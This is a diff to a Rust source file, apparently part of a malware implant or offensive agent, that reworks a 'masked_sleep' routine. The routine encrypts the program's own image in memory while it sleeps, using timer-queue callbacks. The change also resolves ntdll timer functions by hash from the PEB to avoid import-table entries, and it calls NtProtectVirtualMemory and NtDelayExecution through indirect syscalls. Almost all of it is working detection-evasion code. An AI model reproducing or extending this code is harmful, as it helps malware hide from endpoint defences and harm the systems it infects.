@@ -1,16 +1,14 @@
 #[cfg(target_os = "windows")]
-use windows_sys::Win32::{
-    System::{
-        Threading::{
-            CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
-            WT_EXECUTEINTIMERTHREAD,
-        },
-        Memory::{
-            MEMORY_BASIC_INFORMATION, PAGE_NOACCESS, PAGE_EXECUTE_READ,
-            PAGE_EXECUTE_READWRITE, MEM_COMMIT,
-        },
-    },
-    Foundation::HANDLE,
+use windows_sys::Win32::System::Memory::{
+    MEMORY_BASIC_INFORMATION, PAGE_NOACCESS, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, MEM_COMMIT,
+};
+// WT_EXECUTEINTIMERTHREAD value (0x20) — avoids kernel32 IAT import of Threading module
+#[cfg(target_os = "windows")]
+const WT_EXEC_TIMER: u32 = 0x00000020;
+// Non-x64 fallback only: use kernel32 timer queue APIs
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
+use windows_sys::Win32::System::Threading::{
+    CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
 };
 
 #[cfg(target_os = "windows")]
@@ -45,51 +43,105 @@ struct SleepCtx {
     qvm_tramp:  *const u8,
 }
 
-#[cfg(target_os = "windows")]
+/// Resolve RtlCreateTimerQueue/RtlCreateTimer/RtlDeleteTimerQueueEx from ntdll by hash.
+/// Returns (create_queue, create_timer, delete_queue_ex) function pointers or None.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn resolve_rtl_timer_fns() -> Option<(usize, usize, usize)> {
+    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    let ntdll = peb_get_module_base(djb2_hash_lower(b"ntdll.dll"));
+    if ntdll.is_null() { return None; }
+    let ctq = resolve_by_hash(ntdll, djb2_hash(b"RtlCreateTimerQueue"))? as usize;
+    let ct  = resolve_by_hash(ntdll, djb2_hash(b"RtlCreateTimer"))? as usize;
+    let dtq = resolve_by_hash(ntdll, djb2_hash(b"RtlDeleteTimerQueueEx"))? as usize;
+    Some((ctq, ct, dtq))
+}
+
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub unsafe fn masked_sleep(duration_ms: u32) {
     use rand::RngCore;
     use crate::evasion::syscalls::get_ssn;
     rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);
-
     let image_base = get_own_image_base();
     let image_size = if image_base.is_null() { 0 } else { get_image_size(image_base) };
-
-    // Resolve syscall stubs once; store in context to avoid repeated lookups inside callbacks.
     let (prot_ssn, prot_tramp) = get_ssn(b"NtProtectVirtualMemory").unwrap_or((0, core::ptr::null()));
     let (qvm_ssn,  qvm_tramp)  = get_ssn(b"NtQueryVirtualMemory").unwrap_or((0, core::ptr::null()));
 
-    let timer_queue = CreateTimerQueue();
+    // RtlCreateTimerQueue(*mut isize) -> i32
+    // RtlCreateTimer(queue, *mut isize, cb, param, due, period, flags) -> i32
+    // RtlDeleteTimerQueueEx(queue, event) -> i32
+    type RtlCTQ    = unsafe extern "system" fn(*mut isize) -> i32;
+    type RtlCT     = unsafe extern "system" fn(isize, *mut isize, *const core::ffi::c_void, *mut core::ffi::c_void, u32, u32, u32) -> i32;
+    type RtlDelTQEx = unsafe extern "system" fn(isize, isize) -> i32;
+
+    let (p_ctq, p_ct, p_dtq) = match resolve_rtl_timer_fns() {
+        Some(v) => v,
+        None    => { masked_sleep_kernel32(duration_ms, image_base, image_size, prot_ssn, prot_tramp, qvm_ssn, qvm_tramp); return; }
+    };
+    let rtl_ctq: RtlCTQ      = core::mem::transmute(p_ctq);
+    let rtl_ct:  RtlCT       = core::mem::transmute(p_ct);
+    let rtl_dtq: RtlDelTQEx  = core::mem::transmute(p_dtq);
+
+    let mut timer_queue: isize = 0;
+    rtl_ctq(&mut timer_queue);
+    if timer_queue == 0 { return; }
 
     let ctx1 = Box::into_raw(Box::new(SleepCtx {
         base: image_base, size: image_size, encrypt: true,
         prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
     }));
-    let mut t1: HANDLE = 0;
-    CreateTimerQueueTimer(
-        &mut t1, timer_queue,
-        Some(sleep_callback), ctx1 as _, 0, 0,
-        WT_EXECUTEINTIMERTHREAD,
-    );
+    let mut t1: isize = 0;
+    rtl_ct(timer_queue, &mut t1, sleep_callback as *const core::ffi::c_void, ctx1 as *mut core::ffi::c_void, 0, 0, WT_EXEC_TIMER);
 
     let ctx2 = Box::into_raw(Box::new(SleepCtx {
         base: image_base, size: image_size, encrypt: false,
         prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
     }));
-    let mut t2: HANDLE = 0;
-    CreateTimerQueueTimer(
-        &mut t2, timer_queue,
-        Some(sleep_callback), ctx2 as _, duration_ms, 0,
-        WT_EXECUTEINTIMERTHREAD,
-    );
+    let mut t2: isize = 0;
+    rtl_ct(timer_queue, &mut t2, sleep_callback as *const core::ffi::c_void, ctx2 as *mut core::ffi::c_void, duration_ms, 0, WT_EXEC_TIMER);
 
     let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
     if let Some((ssn_delay, tramp_delay)) = get_ssn(b"NtDelayExecution") {
-        crate::evasion::syscalls::indirect_syscall(
-            ssn_delay, tramp_delay,
-            0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0,
-        );
+        crate::evasion::syscalls::indirect_syscall(ssn_delay, tramp_delay, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
     }
-    DeleteTimerQueueEx(timer_queue, windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE);
+    rtl_dtq(timer_queue, -1isize); // -1 = INVALID_HANDLE_VALUE
+}
+
+#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
+pub unsafe fn masked_sleep(duration_ms: u32) {
+    use rand::RngCore;
+    use crate::evasion::syscalls::get_ssn;
+    rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);
+    let image_base = get_own_image_base();
+    let image_size = if image_base.is_null() { 0 } else { get_image_size(image_base) };
+    let (prot_ssn, prot_tramp) = get_ssn(b"NtProtectVirtualMemory").unwrap_or((0, core::ptr::null()));
+    let (qvm_ssn,  qvm_tramp)  = get_ssn(b"NtQueryVirtualMemory").unwrap_or((0, core::ptr::null()));
+    masked_sleep_kernel32(duration_ms, image_base, image_size, prot_ssn, prot_tramp, qvm_ssn, qvm_tramp);
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn masked_sleep_kernel32(
+    duration_ms: u32, image_base: *mut u8, image_size: usize,
+    prot_ssn: u16, prot_tramp: *const u8, qvm_ssn: u16, qvm_tramp: *const u8,
+) {
+    use crate::evasion::syscalls::get_ssn;
+    let timer_queue = CreateTimerQueue();
+    let ctx1 = Box::into_raw(Box::new(SleepCtx {
+        base: image_base, size: image_size, encrypt: true,
+        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
+    }));
+    let mut t1: isize = 0;
+    CreateTimerQueueTimer(&mut t1, timer_queue, Some(sleep_callback), ctx1 as _, 0, 0, WT_EXEC_TIMER);
+    let ctx2 = Box::into_raw(Box::new(SleepCtx {
+        base: image_base, size: image_size, encrypt: false,
+        prot_ssn, prot_tramp, qvm_ssn, qvm_tramp,
+    }));
+    let mut t2: isize = 0;
+    CreateTimerQueueTimer(&mut t2, timer_queue, Some(sleep_callback), ctx2 as _, duration_ms, 0, WT_EXEC_TIMER);
+    let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
+    if let Some((ssn_delay, tramp_delay)) = get_ssn(b"NtDelayExecution") {
+        crate::evasion::syscalls::indirect_syscall(ssn_delay, tramp_delay, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
+    }
+    DeleteTimerQueueEx(timer_queue, -1isize);
 }
 
 #[cfg(target_os = "windows")]
